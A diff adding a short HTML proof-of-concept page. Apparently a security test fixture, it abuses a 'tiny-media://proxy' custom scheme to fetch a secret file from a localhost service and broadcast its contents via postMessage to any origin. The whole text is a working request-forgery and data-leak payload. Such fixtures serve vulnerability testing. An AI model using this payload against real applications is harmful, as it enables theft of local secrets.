@@ -1,0 +1,5 @@
+<!doctype html><script>
+// runs AS tiny-media://proxy — a same-origin fetch sends no Origin header
+fetch('tiny-media://proxy/?u=' + encodeURIComponent('http://127.0.0.1:8765/secret.txt'))
+  .then(r => r.text()).then(t => top.postMessage('nav:' + t + ' origin=' + location.origin, '*'), e => top.postMessage('nav-err:' + e + ' origin=' + location.origin, '*'));
+</script>
